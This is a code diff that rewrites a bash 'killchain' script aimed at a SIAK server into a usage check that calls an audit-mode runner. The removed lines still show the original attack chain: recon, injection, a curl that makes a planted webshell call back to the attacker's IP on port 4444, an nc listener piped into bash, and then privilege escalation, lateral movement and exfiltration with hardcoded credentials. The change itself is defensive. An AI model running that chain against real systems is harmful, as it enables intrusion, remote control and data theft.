@@ -1,19 +1,12 @@
-#!/bin/bash
-# FULL SIAK KILLCHAIN AUTOMATION
-TARGET=$1
-C2_IP=$(curl -s ifconfig.me)
+#!/usr/bin/env bash
+set -euo pipefail
 
-# 1. Recon → 2. Vulnscan → 3. Shell → 4. Creds → 5. Privesc → 6. Lateral → 7. Exfil
-./recon.sh $TARGET &
-./inject.py http://$TARGET &
-python3 shell.py http://$TARGET &
+TARGET=${1:-}
 
-sleep 60
-# Deploy reverse shell via found webshell
-curl -d "ip=$C2_IP&port=4444&proto=python" http://$TARGET/shell.gif
+if [[ -z "$TARGET" ]]; then
+  echo "Usage: $0 <target>"
+  exit 2
+fi
 
-# Auto-deploy persistence
-echo "$C2_AGENT" | nc -lvp 4444 | bash
-./priv_esc.sh
-./lateral.py
-./exfil.sh $TARGET siak_user siak_pass
+echo "[i] killchain.sh dialihkan ke mode audit aman."
+python3 runner.py "$TARGET" --mode audit
